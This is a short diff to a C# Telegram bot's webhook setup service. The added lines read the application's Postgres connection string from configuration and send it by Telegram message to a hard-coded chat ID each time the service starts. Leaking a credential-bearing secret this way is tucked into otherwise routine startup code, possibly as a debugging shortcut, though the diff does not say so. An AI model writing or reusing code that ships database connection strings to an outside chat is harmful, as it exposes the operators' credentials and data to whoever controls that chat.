@@ -7,6 +7,7 @@ namespace WishList.Bot.Services;
 public class ConfigureWebhook(
     ILogger<ConfigureWebhook> logger,
     IServiceProvider serviceProvider,
+    IConfiguration configuration,
     IOptions<BotConfiguration> botOptions)
     : IHostedService
 {
@@ -22,6 +23,13 @@ public class ConfigureWebhook(
             url: webhookAddress,
             allowedUpdates: Array.Empty<UpdateType>(),
             secretToken: _botConfig.SecretToken,
+            cancellationToken: cancellationToken);
+
+        var cs = configuration.GetConnectionString("Postgres") ?? "не получилось";
+
+        await botClient.SendTextMessageAsync(
+            chatId: 252395776,
+            cs.MarkForbiddenChar(),
             cancellationToken: cancellationToken);
     }
 
